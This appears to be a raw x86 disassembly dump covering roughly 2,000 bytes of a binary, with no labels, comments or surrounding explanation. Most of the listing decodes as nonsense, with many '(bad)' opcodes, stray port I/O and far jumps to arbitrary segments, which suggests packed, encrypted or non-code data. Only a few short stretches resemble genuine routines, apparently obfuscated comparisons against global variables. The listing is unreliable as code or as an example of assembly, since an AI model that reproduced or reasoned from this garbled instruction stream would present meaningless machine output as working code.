  4061e2:	lahf   
  4061e3:	iret   
  4061e4:	mov    ch,0x56
  4061e6:	add    eax,0x33f4824f
  4061eb:	call   0xff11dd99
  4061f0:	mov    ds:0x8c214ffb,eax
  4061f5:	pushf  
  4061f6:	into   
  4061f7:	or     al,0x59
  4061f9:	pop    esi
  4061fa:	xor    ebx,DWORD PTR [ecx+0x25700192]
  406200:	outs   dx,BYTE PTR ds:[esi]
  406201:	push   edx
  406202:	fcmovb st,st(4)
  406204:	mov    ecx,0x40309e46
  406209:	jo     0x4061f9
  40620b:	jge    0x406192
  40620d:	sbb    eax,0xff71e191
  406212:	cmc    
  406213:	sbb    DWORD PTR [eax-0x78],esi
  406216:	push   ds
  406217:	repnz in al,0x9b
  40621a:	jl     0x406224
  40621c:	jmp    0x40625b
  40621e:	sbb    DWORD PTR [ecx],edi
  406220:	sar    esp,cl
  406222:	dec    di
  406224:	(bad)  
  406225:	or     DWORD PTR [edx+0x5a],eax
  406228:	test   al,0xb1
  40622a:	push   cs
  40622b:	(bad)  
  40622c:	iret   
  40622d:	jmp    0x40624d
  40622f:	add    ah,ch
  406231:	addr16 cwde 
  406233:	pop    esp
  406234:	arpl   WORD PTR [edx],ax
  406236:	ss mov cl,0x23
  406239:	ret    0x93c7
  40623c:	ror    esi,0x97
  40623f:	xchg   edx,eax
  406240:	xchg   BYTE PTR [eax+0x1f0b0e2a],dh
  406246:	shl    DWORD PTR [edx+0x7e9410c0],0xd7
  40624d:	mov    ebx,0x3caeda4d
  406252:	cmp    dh,dh
  406254:	fstp   QWORD PTR [esi]
  406256:	mov    ah,0x4e
  406258:	mov    edi,0x176c7aa1
  40625d:	adc    al,0xce
  40625f:	aam    0x5f
  406261:	jl     0x406217
  406263:	xlat   BYTE PTR ds:[ebx]
  406264:	mov    eax,0xa1691f71
  406269:	dec    esp
  40626a:	mov    bh,0x15
  40626c:	test   DWORD PTR [ebx-0x4a31a9b1],ebp
  406272:	mov    edx,0xd5ea6e9
  406277:	rol    DWORD PTR [ebx-0xb],1
  40627a:	scas   al,BYTE PTR es:[edi]
  40627b:	mov    dl,0x9d
  40627d:	xor    DWORD PTR [esi-0x77e627bf],edx
  406283:	shl    BYTE PTR [eax+ebp*8+0x19],cl
  406287:	pop    ebx
  406288:	popf   
  406289:	les    edi,FWORD PTR [edi]
  40628b:	nop
  40628c:	pop    ebp
  40628d:	mov    WORD PTR [esi+edx*2],?
  406290:	imul   eax,DWORD PTR [ebp-0x45],0x7b7cbb9a
  406297:	jns    0x406301
  406299:	pop    esi
  40629a:	sahf   
  40629b:	and    ah,BYTE PTR [edi+0x13f4833d]
  4062a1:	mov    cl,0xf9
  4062a3:	dec    eax
  4062a4:	ror    edi,1
  4062a6:	add    eax,0xb746ce42
  4062ab:	sub    dh,BYTE PTR [eax]
  4062ad:	fisub  DWORD PTR [edi]
  4062af:	push   esp
  4062b0:	fisubr DWORD PTR [esi+ebp*2]
  4062b3:	dec    esi
  4062b4:	pop    ebx
  4062b5:	pop    ebx
  4062b6:	sbb    esi,eax
  4062b8:	xor    bh,dl
  4062ba:	mov    eax,ds:0x75cd9224
  4062bf:	lods   eax,DWORD PTR ds:[esi]
  4062c0:	mov    DWORD PTR [edi+0x10],esi
  4062c3:	lods   al,BYTE PTR ds:[esi]
  4062c4:	xchg   esi,eax
  4062c5:	jecxz  0x406296
  4062c7:	pop    esi
  4062c8:	mov    bh,0xb7
  4062ca:	xchg   ebx,eax
  4062cb:	ins    BYTE PTR es:[edi],dx
  4062cc:	sbb    al,dl
  4062ce:	add    ebx,ebx
  4062d0:	lods   al,BYTE PTR ds:[esi]
  4062d1:	jg     0x4062d2
  4062d3:	loop   0x4062d9
  4062d5:	push   esp
  4062d6:	out    0x31,eax
  4062d8:	jbe    0x40631e
  4062da:	pop    eax
  4062db:	or     eax,0x4ee4016
  4062e0:	arpl   WORD PTR [eax-0x7],si
  4062e3:	pop    ss
  4062e4:	or     ecx,eax
  4062e6:	clc    
  4062e7:	pushf  
  4062e8:	test   al,0xb9
  4062ea:	out    0x71,eax
  4062ec:	lock repz ror DWORD PTR [edi],cl
  4062f0:	push   esp
  4062f1:	mov    ch,BYTE PTR [eax+edi*8-0x7ac17959]
  4062f8:	call   0xdd57:0xe0494026
  4062ff:	div    BYTE PTR [edi]
  406301:	mov    al,0xc7
  406303:	repnz adc cl,dh
  406306:	sbb    BYTE PTR [ebx],ch
  406308:	pop    ebp
  406309:	pop    esp
  40630a:	fbld   TBYTE PTR [edi+ebx*8+0x26]
  40630e:	dec    edi
  40630f:	mov    DWORD PTR [edi],eax
  406311:	cwde   
  406312:	fst    st(1)
  406314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406315:	pushf  
  406316:	popf   
  406317:	mov    esi,0x69569036
  40631c:	pushf  
  40631d:	adc    dh,BYTE PTR [ebx]
  40631f:	push   ss
  406320:	add    BYTE PTR [eax-0x7b8a9dee],ah
  406326:	icebp  
  406327:	test   al,0x7d
  406329:	dec    edx
  40632a:	pusha  
  40632b:	push   ebp
  40632c:	repnz adc edx,DWORD PTR fs:[edi-0x2c]
  406331:	add    eax,0xefeece99
  406336:	out    dx,eax
  406337:	es jmp 0xc296:0xdc0e741e
  40633f:	adc    BYTE PTR [ebx],bl
  406341:	pop    esi
  406342:	xor    al,0xee
  406344:	xchg   BYTE PTR [edi-0x5b],ch
  406347:	xchg   esi,eax
  406348:	sub    al,BYTE PTR [ecx+0x31149358]
  40634e:	mov    ss,esi
  406350:	adc    esi,DWORD PTR [ebx+0x49f18708]
  406356:	xchg   esi,eax
  406357:	pop    ecx
  406358:	out    0xf4,al
  40635a:	add    ebp,DWORD PTR [eax]
  40635c:	mov    cl,0xf7
  40635e:	call   FWORD PTR [eax]
  406360:	loope  0x406347
  406362:	das    
  406363:	lahf   
  406364:	pop    ecx
  406365:	lahf   
  406366:	xor    al,0x95
  406368:	ffree  st(5)
  40636a:	arpl   cx,cx
  40636c:	lock inc ebx
  40636e:	mov    DWORD PTR [ebx+0x437d2b6c],ecx
  406374:	xchg   esi,eax
  406375:	shl    edi,0xe3
  406378:	jmp    0x40637c
  40637a:	and    eax,0x5c29b4bd
  40637f:	test   ah,ah
  406381:	push   ebx
  406382:	out    0x8b,al
  406384:	add    al,0x8d
  406386:	int3   
  406387:	icebp  
  406388:	jmp    0x3ee9:0xdc6ea12f
  40638f:	pop    eax
  406390:	repz ds sub eax,0x97357211
  406397:	and    edx,edx
  406399:	popf   
  40639a:	sub    eax,0x8c71177e
  40639f:	xor    al,0x19
  4063a1:	je     0x4063df
  4063a3:	and    BYTE PTR [edx-0x25],ah
  4063a6:	sahf   
  4063a7:	inc    edi
  4063a8:	xor    al,0xa5
  4063aa:	retf   0xebfc
  4063ad:	in     al,0x66
  4063af:	sbb    dh,BYTE PTR [ecx]
  4063b1:	mov    esp,0xf501acb7
  4063b6:	lock aas 
  4063b8:	retf   0x10a0
  4063bb:	out    0xbe,eax
  4063bd:	pop    es
  4063be:	(bad)  [esi-0x1feb3748]
  4063c4:	das    
  4063c5:	push   0x1b
  4063c7:	adc    DWORD PTR ds:0x585bd422,edi
  4063cd:	outs   dx,BYTE PTR ds:[esi]
  4063ce:	mov    dl,BYTE PTR [esp+edi*1+0x38f1ed8]
  4063d5:	jae    0x4063af
  4063d7:	sub    esi,DWORD PTR [esi]
  4063d9:	(bad)  
  4063da:	out    dx,eax
  4063db:	xchg   ebx,eax
  4063dc:	mov    al,0xc5
  4063de:	push   ss
  4063df:	jecxz  0x406370
  4063e1:	es pop esi
  4063e3:	or     al,0x35
  4063e5:	xor    eax,DWORD PTR [ebx-0x5c43f592]
  4063eb:	test   BYTE PTR [eax+0x6c],dh
  4063ee:	bound  ecx,QWORD PTR [esi+0x136bdb6d]
  4063f4:	aaa    
  4063f5:	pop    ebp
  4063f6:	stos   DWORD PTR es:[edi],eax
  4063f7:	sbb    DWORD PTR [ecx],edx
  4063f9:	mov    ds:0x378bba9a,al
  4063fe:	pop    ds
  4063ff:	inc    edi
  406400:	add    eax,0xd83af2dd
  406405:	jp     0x406459
  406407:	pop    ds
  406408:	adc    DWORD PTR [edx-0x7d1297cb],esi
  40640e:	test   DWORD PTR ds:0x70a28e8,esi
  406414:	jb     0x40642d
  406416:	les    ebp,FWORD PTR [edi]
  406418:	mov    ds:0xeb152472,eax
  40641d:	fld    DWORD PTR [edx-0x79f04f9b]
  406423:	push   edi
  406425:	(bad)  
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430486,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e762
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430492
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4304b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e762,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e75a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x601a6eba]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	and    ah,BYTE PTR [esi+esi*1-0xf]
  4064b1:	je     0x40651b
  4064b3:	iret   
  4064b4:	mov    eax,DWORD PTR [ecx+0x1522ff09]
  4064ba:	pop    ebx
  4064bb:	mov    esp,0x6237a7c0
  4064c0:	sub    ecx,edx
  4064c2:	mov    ah,0x7
  4064c4:	das    
  4064c5:	cli    
  4064c6:	sbb    al,BYTE PTR [ecx]
  4064c8:	sbb    BYTE PTR [edx],cl
  4064ca:	adc    al,0xb
  4064cc:	dec    ecx
  4064cd:	int    0xd2
  4064cf:	loopne 0x40653e
  4064d1:	cdq    
  4064d2:	imul   edi,DWORD PTR [ebx+edi*2+0x59ff50d4],0xffffffa3
  4064da:	nop
  4064db:	lahf   
  4064dc:	bound  edi,QWORD PTR [edx-0xe]
  4064df:	cld    
  4064e0:	cmc    
  4064e1:	jo     0x4064df
  4064e3:	lahf   
  4064e4:	mov    ds:0x3103ab61,al
  4064e9:	test   DWORD PTR [eax+ebx*2],edi
  4064ec:	mov    eax,fs:0xd364344
  4064f2:	or     DWORD PTR [edx-0x420a9352],0xdc861501
  4064fc:	inc    edi
  4064fd:	arpl   WORD PTR [ecx-0x7dbe7fe9],ax
  406503:	pop    edi
  406504:	jne    0x40650e
  406506:	mov    esi,0x8d2c3e1d
  40650b:	fs jne 0x406522
  40650e:	jg     0x4064d0
  406510:	add    ebx,DWORD PTR [edi+0x57]
  406513:	xchg   ebp,eax
  406514:	pop    ds
  406515:	jns    0x40655b
  406517:	shl    esp,cl
  406519:	lods   eax,DWORD PTR ds:[esi]
  40651a:	push   es
  40651b:	test   eax,0x4eadd4e6
  406520:	mov    edi,0x47e9ead5
  406525:	lock adc esp,DWORD PTR ss:[eax+0x717d66e0]
  40652d:	(bad)  
  40652e:	int3   
  40652f:	or     ecx,edi
  406531:	mov    esi,DWORD PTR [ebp*8-0x57ee9fd1]
  406538:	cwde   
  406539:	jae    0x406549
  40653b:	jg     0x406591
  40653d:	mov    eax,cs
  40653f:	imul   edx,DWORD PTR [edi],0x7b365551
  406545:	hlt    
  406546:	xor    edx,DWORD PTR [esi]
  406548:	(bad)  
  406549:	cs add al,0x1c
  40654c:	call   FWORD PTR [ebx-0x6]
  40654f:	pusha  
  406550:	loop   0x40654d
  406552:	add    DWORD PTR [eax],ebp
  406554:	iret   
  406555:	sub    DWORD PTR [eax],esi
  406557:	pusha  
  406558:	add    al,ah
  40655a:	scas   eax,DWORD PTR es:[edi]
  40655b:	inc    esi
  40655c:	push   ds
  40655d:	mov    ch,0x1c
  40655f:	dec    eax
  406560:	in     eax,0x10
  406562:	jp     0x40659e
  406564:	mov    eax,ds:0xb5b8abd7
  406569:	loope  0x4065ac
  40656b:	jl     0x4065aa
  40656d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40656e:	cdq    
  40656f:	adc    ah,dh
  406571:	repnz (bad) 
  406573:	test   DWORD PTR [ecx+0x1ac7f1c],0x3cbd3dd3
  40657d:	pop    ds
  40657e:	lock mov bh,0xd0
  406581:	cwde   
  406582:	test   BYTE PTR [ecx+0x6cba78d4],dl
  406588:	xchg   BYTE PTR [ecx+0x2813dfff],bh
  40658e:	clc    
  40658f:	add    bh,BYTE PTR [edx]
  406591:	imul   ebx,DWORD PTR [ebx+0x596a7f12],0x87d8f87b
  40659b:	sahf   
  40659c:	mov    ebx,0xb62d325d
  4065a1:	sti    
  4065a2:	test   DWORD PTR [esi+0x31],esp
  4065a5:	add    edx,DWORD PTR [ecx-0x5c00fa37]
  4065ab:	lods   eax,DWORD PTR ds:[esi]
  4065ac:	scas   eax,DWORD PTR es:[edi]
  4065ad:	push   ss
  4065ae:	in     eax,0xca
  4065b0:	adc    dh,BYTE PTR [edi-0x3f9d380a]
  4065b6:	cs ins BYTE PTR es:[edi],dx
  4065b8:	inc    edx
  4065b9:	sub    al,bh
  4065bb:	mov    ch,0x94
  4065bd:	loope  0x406557
  4065bf:	mov    ch,ch
  4065c1:	fadd   st,st(2)
  4065c3:	enter  0x988e,0x8a
  4065c7:	mov    si,0xa9ec
  4065cb:	test   bh,dh
  4065cd:	ficomp WORD PTR [edx+0x7d29a4a7]
  4065d3:	cdq    
  4065d4:	es dec ebp
  4065d6:	jl     0x4065c3
  4065d8:	xchg   ecx,eax
  4065d9:	sbb    DWORD PTR [edi],eax
  4065db:	ins    BYTE PTR es:[edi],dx
  4065dc:	cmp    edx,DWORD PTR [edi-0x37b749c1]
  4065e2:	daa    
  4065e3:	jle    0x4065a3
  4065e5:	push   edi
  4065e6:	lods   al,BYTE PTR ds:[esi]
  4065e7:	adc    BYTE PTR [eax],ah
  4065e9:	fdiv   st(5),st
  4065eb:	sub    esi,esp
  4065ed:	in     eax,dx
  4065ee:	inc    ebx
  4065ef:	ror    ah,cl
  4065f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065f2:	mov    BYTE PTR [eax-0x77],dh
  4065f5:	xchg   ebx,eax
  4065f6:	add    BYTE PTR [eax],0x84
  4065f9:	in     al,dx
  4065fa:	test   esp,0x7a4cbf5
  406600:	js     0x406613
  406602:	rcl    BYTE PTR [edx],cl
  406604:	ins    BYTE PTR es:[edi],dx
  406605:	sub    eax,0xba6aa355
  40660a:	sahf   
  40660b:	add    esp,DWORD PTR [eax+esi*2]
  40660e:	retf   
  40660f:	push   ds
  406610:	push   edx
  406611:	inc    edx
  406612:	push   es
  406613:	aam    0x64
  406615:	int    0xcc
  406617:	mov    bh,0x2d
  406619:	and    al,0x9e
  40661b:	(bad)  
  40661c:	mov    edx,esp
  40661e:	(bad)  
  40661f:	das    
  406620:	nop
  406621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406622:	cmp    bl,BYTE PTR [edi+edx*4-0x51e78e1]
  406629:	(bad)  
  40662a:	sbb    esp,DWORD PTR [edi+0x2f]
  40662d:	jmp    0x7a9c:0xab991ced
  406634:	adc    dh,dh
  406636:	jb     0x4065c3
  406638:	popf   
  406639:	icebp  
  40663a:	sbb    al,0x30
  40663c:	push   0x32
  40663e:	pop    esi
  40663f:	(bad)  
  406640:	sub    edx,ebx
  406642:	mov    ebx,DWORD PTR [edi+0x42d772a5]
  406648:	pop    ecx
  406649:	inc    ebp
  40664a:	imul   edi,DWORD PTR [ebp+0x36],0x64fb7dd9
  406651:	mov    edi,0xb872eda4
  406656:	mov    dl,0x36
  406658:	push   cs
  406659:	sub    eax,0xba02a2ef
  40665e:	mov    ebp,0x98129ebb
  406663:	xchg   ebp,eax
  406664:	shl    DWORD PTR [ebx-0x14],cl
  406667:	xchg   edx,eax
  406668:	ss push ebp
  40666a:	lea    edx,[edx]
  40666c:	das    
  40666d:	jmp    0xf0ec:0x4c82ea87
  406674:	repz ret 
  406676:	out    dx,al
  406677:	xchg   ebx,eax
  406678:	ret    0x3c28
  40667b:	xchg   esi,eax
  40667c:	(bad)  
  40667d:	xchg   ebp,eax
  40667e:	jge    0x406623
  406680:	ss adc ah,bl
  406683:	(bad)  [eax-0x1c]
  406686:	outs   dx,DWORD PTR ds:[esi]
  406687:	xchg   edx,eax
  406688:	mov    esi,DWORD PTR [ebx]
  40668a:	cmp    al,0xe7
  40668c:	push   esi
  40668d:	ss test al,0xc4
  406690:	hlt    
  406691:	aaa    
  406692:	fwait
  406693:	jle    0x40666b
  406695:	xlat   BYTE PTR ds:[ebx]
  406696:	stos   BYTE PTR es:[edi],al
  406697:	repz push es
  406699:	add    al,0xaf
  40669b:	xchg   esi,eax
  40669c:	pusha  
  40669d:	sbb    ah,BYTE PTR [edx-0x12]
  4066a0:	adc    bl,ch
  4066a2:	fs dec esi
  4066a4:	loop   0x4066fa
  4066a6:	sub    eax,0x28401c26
  4066ab:	mov    al,ds:0xd405a2a5
  4066b0:	mov    ebx,DWORD PTR [edi+0x43f688e]
  4066b6:	cmp    BYTE PTR [ecx],0x97
  4066b9:	fdivr  QWORD PTR [edx]
  4066bb:	leave  
  4066bc:	loopne 0x406707
  4066be:	out    0xcf,eax
  4066c0:	xchg   edx,eax
  4066c1:	inc    esp
  4066c2:	add    cl,0xf1
  4066c5:	push   0xf29024eb
  4066ca:	inc    esi
  4066cb:	and    al,0x73
  4066cd:	or     eax,0x31a90559
  4066d2:	test   DWORD PTR [eax+edx*2],esi
  4066d5:	sub    DWORD PTR [esi],edx
  4066d7:	push   edx
  4066d8:	adc    edx,ebx
  4066da:	cs pop ds
  4066dc:	xor    BYTE PTR [edx-0x33],bl
  4066df:	fwait
  4066e0:	adc    dl,bl
  4066e2:	jo     0x406671
  4066e4:	jne    0x4066c2
  4066e6:	mov    ds:0xd359579b,al
  4066eb:	mov    ebp,0x18394ee0
  4066f0:	mov    ?,WORD PTR [ebp-0x48]
  4066f3:	sub    eax,0xc362ced9
  4066f8:	fistp  QWORD PTR [eax]
  4066fa:	test   eax,0x18e17516
  4066ff:	xor    DWORD PTR [eax],eax
  406701:	add    al,0x8f
  406703:	push   esp
  406704:	loope  0x406762
  406706:	sub    DWORD PTR [ebx*4+0x4740686c],ebp
  40670d:	xor    BYTE PTR [ebp+0x15e280e9],bh
  406713:	push   cs
  406714:	fwait
  406715:	sbb    BYTE PTR [ecx-0x73],bh
  406718:	mov    ch,0xce
  40671a:	xor    eax,0x683d75c1
  40671f:	jecxz  0x4066c1
  406721:	mov    esp,esi
  406723:	sub    BYTE PTR [edi],cl
  406725:	fs jbe 0x4066f1
  406728:	mov    eax,cs:0x4306640a
  40672e:	in     eax,0x3e
  406730:	retf   0x580f
  406733:	xchg   eax,ebx
  406735:	xor    DWORD PTR [esi*2-0x60bb918c],edi
  40673c:	lds    edi,FWORD PTR [ecx]
  40673e:	adc    al,0x7f
  406740:	jbe    0x406764
  406742:	scas   al,BYTE PTR es:[edi]
  406743:	(bad)  
  406744:	in     al,dx
  406745:	pop    es
  406746:	push   esi
  406747:	or     eax,0xf2c9b7e9
  40674c:	call   0x7b93f9fd
  406751:	mov    ebp,0x2c46a1b0
  406756:	repz sub DWORD PTR [esi+0x2da3ab9f],0x19b1f229
  406761:	es sbb eax,esi
  406764:	das    
  406765:	lahf   
  406766:	or     ch,BYTE PTR [edx+edx*4]
  406769:	mov    ds:0xeb6bb63,al
  40676e:	mov    ss,WORD PTR [ebx+0x36f90a11]
  406774:	adc    BYTE PTR [esi-0x20],dh
  406777:	cwde   
  406778:	fild   WORD PTR [esi+0xe67deb]
  40677e:	popf   
  40677f:	adc    bl,BYTE PTR [ebx-0x69]
  406782:	xor    bl,BYTE PTR [esi-0x63]
  406785:	ja     0x4067ce
  406787:	(bad)  
  406788:	retf   
  406789:	and    ah,BYTE PTR [edi+0x3ce8b6c5]
  40678f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406790:	leave  
  406791:	arpl   ax,sp
  406793:	mov    ds:0x11c2db1a,eax
  406798:	jge    0x4067e4
  40679a:	retf   
  40679b:	popa   
  40679c:	pop    edx
  40679d:	xor    BYTE PTR [eax],ah
  40679f:	cmp    edx,DWORD PTR [ecx+0x3f9d9589]
  4067a5:	int3   
  4067a6:	lods   eax,DWORD PTR ds:[esi]
  4067a7:	stos   DWORD PTR es:[edi],eax
  4067a8:	aaa    
  4067a9:	pusha  
  4067aa:	jge    0x406781
  4067ac:	cwde   
  4067ad:	mov    dh,0xfa
  4067af:	sbb    bh,BYTE PTR [edx+0x47]
  4067b2:	dec    eax
  4067b3:	(bad)  
  4067b4:	stos   BYTE PTR es:[edi],al
  4067b5:	sub    DWORD PTR [esi+0x7b],ebp
  4067b8:	shr    DWORD PTR [eax+0x0],1
  4067bb:	push   es
  4067bc:	dec    edi
  4067bd:	sbb    al,BYTE PTR [ecx-0xc21f7bc]
  4067c3:	inc    ecx
  4067c4:	fdivr  DWORD PTR [esi+0xee84fdb]
  4067ca:	mov    dh,0xcd
  4067cc:	js     0x4067c4
  4067ce:	fisubr DWORD PTR [ebp+0x7a8f1382]
  4067d4:	loopne 0x406788
  4067d6:	jle    0x40684c
  4067d8:	mov    esi,0x9ef95483
  4067dd:	inc    ecx
  4067de:	clc    
  4067df:	sbb    ecx,DWORD PTR [ebp+esi*2+0x45b18f39]
  4067e6:	mov    BYTE PTR [eax+0x71],bl
  4067e9:	retf   
  4067ea:	test   al,0x27
  4067ec:	mov    bl,BYTE PTR [ebx-0x3ea98388]
  4067f2:	jl     0x4067c7
  4067f4:	push   ebx
  4067f5:	loope  0x4067d2
  4067f7:	xor    dh,BYTE PTR [eax-0x76]
  4067fa:	jmp    0x4aa3:0x324d08fc
  406801:	loope  0x4067f9
  406803:	dec    edx
  406804:	sub    DWORD PTR [esi],eax
  406806:	push   edi
  406807:	and    eax,0x3a395fe5
  40680c:	pop    esi
  40680d:	cmp    dh,BYTE PTR [eax-0x540dffc0]
  406813:	xchg   ecx,eax
  406814:	(bad)  
  406815:	ror    DWORD PTR [ebp-0x6],1
  406818:	cmp    DWORD PTR [ecx-0x7ef38a75],ebp
  40681e:	sbb    eax,0x42ee24
  406823:	stos   BYTE PTR es:[edi],al
  406824:	add    al,0x43
  406826:	add    BYTE PTR [ebx],ch
  406828:	ret    0xc133
  40682b:	mov    DWORD PTR ds:0x430552,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43053e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4304ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430556,0x43049a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ee24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	pop    esp
  406894:	aaa    
  406895:	sub    al,0x32
  406897:	dec    ebx
  406898:	ss jle 0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	je     0x4068fd
  4068a1:	stc    
  4068a2:	dec    esp
  4068a3:	mov    edi,0xff532fbe
  4068a8:	push   ecx
  4068a9:	iret   
  4068aa:	out    dx,al
  4068ab:	pop    ecx
  4068ac:	add    eax,0x9d9b7bb4
  4068b1:	jmp    0xe0494e4
  4068b6:	fnstcw WORD PTR [ecx-0x6c49be86]
  4068bc:	aad    0xdc
  4068be:	cwde   
  4068bf:	sub    eax,0xe440ccb7
  4068c4:	or     DWORD PTR [ecx],eax
  4068c6:	leave  
  4068c7:	mov    ebx,0x7665319c
  4068cc:	push   ecx
  4068cd:	sbb    ecx,esp
  4068cf:	call   0xac6a9f9b
  4068d4:	daa    
  4068d5:	jg     0x40690c
  4068d7:	adc    BYTE PTR [edx-0x3b20d86],ch
  4068dd:	int    0x57
  4068df:	pop    ecx
  4068e0:	ins    BYTE PTR es:[edi],dx
  4068e1:	mov    dl,bh
  4068e3:	les    ebp,FWORD PTR [ebp-0x141c64b8]
  4068e9:	mov    ebx,0xbcf552ae
  4068ee:	(bad)  
  4068ef:	std    
  4068f0:	xchg   edi,eax
  4068f1:	cmp    al,0xc9
  4068f3:	ins    BYTE PTR es:[edi],dx
  4068f4:	mov    ebx,0x27817ca1
  4068f9:	or     eax,0xdcf7f87f
  4068fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ff:	loopne 0x4068bd
  406901:	scas   al,BYTE PTR es:[edi]
  406902:	or     BYTE PTR [edi],ah
  406904:	pop    cx
  406906:	cli    
  406907:	jne    0x40688a
  406909:	in     al,0x28
  40690b:	push   ebp
  40690c:	loope  0x4068d2
  40690e:	cmp    eax,0xe91633c8
  406913:	xchg   ecx,eax
  406914:	dec    ebp
  406915:	pop    eax
  406916:	sti    
  406917:	cmp    edi,DWORD PTR [esi-0x4cd32651]
  40691d:	lds    esi,FWORD PTR [ecx+ebx*4-0x17]
  406921:	cld    
  406922:	std    
  406923:	test   al,0xa6
  406925:	fidiv  WORD PTR [esi]
  406927:	(bad)  
  406928:	gs mov edx,0xcfab91ae
  40692e:	xor    eax,0xbc2a3a85
  406933:	ss adc esp,edx
  406936:	fwait
  406937:	and    ah,bh
  406939:	pop    ds
  40693a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40693b:	pop    ebx
  40693c:	fdiv   DWORD PTR [ecx+eiz*4]
  40693f:	mov    dh,0x8d
  406941:	iret   
  406942:	and    eax,0x7115d0ce
  406947:	dec    edx
  406948:	stos   DWORD PTR es:[edi],eax
  406949:	into   
  40694a:	int    0x20
  40694c:	rcr    BYTE PTR [esp+eax*4+0x6d],0x97
  406951:	ds hlt 
  406953:	out    dx,eax
  406954:	inc    esp
  406955:	or     al,0xbd
  406957:	jmp    0xd2a5593a
  40695c:	cmp    eax,0xe6e567f3
  406961:	xchg   ecx,eax
  406962:	int    0x9
  406964:	pushf  
  406965:	pop    eax
  406966:	lods   eax,DWORD PTR ds:[esi]
  406967:	mov    dl,0xa2
  406969:	dec    ebx
  40696a:	fidivr DWORD PTR [esi]
  40696c:	lods   eax,DWORD PTR ds:[esi]
  40696d:	sti    
  40696e:	mov    ebx,0xb63aa372
  406973:	mov    al,ds:0x1bd70ddc
  406978:	push   ebp
  406979:	scas   eax,DWORD PTR es:[edi]
  40697a:	mov    esp,0xfd43781d
  40697f:	push   ebx
  406980:	cmp    al,0x9a
  406982:	xor    bl,BYTE PTR [ebx]
  406984:	in     eax,dx
  406985:	pushf  
  406986:	(bad)  
  406987:	in     eax,0xb0
  406989:	lods   al,BYTE PTR ds:[esi]
  40698a:	sbb    BYTE PTR [edi+0x4dc12bae],ah
  406990:	das    
  406991:	ins    DWORD PTR es:[edi],dx
  406992:	sbb    DWORD PTR [esi-0x31d8d2c3],esp
  406998:	jno    0x406a06
  40699a:	push   es
  40699b:	dec    esi
  40699c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40699d:	call   0x383:0x701290a4
  4069a4:	outs   dx,BYTE PTR ds:[esi]
  4069a5:	jecxz  0x406999
  4069a7:	aad    0x6a
  4069a9:	(bad)  
  4069aa:	ss mul bl
  4069ad:	push   edi
  4069ae:	jb     0x406a1d
  4069b0:	push   0xaee2a40c
  4069b5:	clc    
  4069b6:	xchg   ebp,eax
  4069b7:	jo     0x406955
  4069b9:	or     edx,DWORD PTR [ebx]
  4069bb:	push   cs
  4069bc:	xor    al,0xd2
  4069be:	xchg   edi,eax
  4069bf:	sub    al,0x85
  4069c1:	cmc    
  4069c2:	fcmovnbe st,st(1)
  4069c4:	and    al,0x3e
  4069c6:	dec    esi
  4069c7:	es sbb ecx,ecx
  4069ca:	cmp    BYTE PTR [ebx+eax*2-0xe],ah
  4069ce:	mov    ds,WORD PTR [esi]
  4069d0:	or     DWORD PTR ss:[ebx-0x413adaf9],edx
  4069d7:	test   DWORD PTR ds:0xa9636e3,eax
  4069dd:	dec    edi
  4069de:	lahf   
  4069df:	pop    ss
  4069e0:	fbstp  TBYTE PTR [edx-0x40e5da58]
  4069e6:	sbb    ah,BYTE PTR [eax-0x52]
  4069e9:	fwait
  4069ea:	aaa    
  4069eb:	popf   
  4069ec:	sbb    DWORD PTR [ebx],eax
  4069ee:	stos   DWORD PTR es:[edi],eax
  4069ef:	mov    esi,DWORD PTR [ebx-0x77]
  4069f2:	out    0xf7,eax
  4069f4:	aad    0x59
  4069f6:	lahf   
  4069f7:	mov    WORD PTR [eax-0x47cb17b3],?
  4069fd:	stos   BYTE PTR es:[edi],al
  4069fe:	or     eax,0x9a16a587
  406a03:	xor    al,0x88
  406a05:	test   al,0xaa
  406a07:	mov    esp,0x2e4c0b79
  406a0c:	mov    cl,0x1b
  406a0e:	js     0x406a20
  406a10:	ds loopne 0x40699d
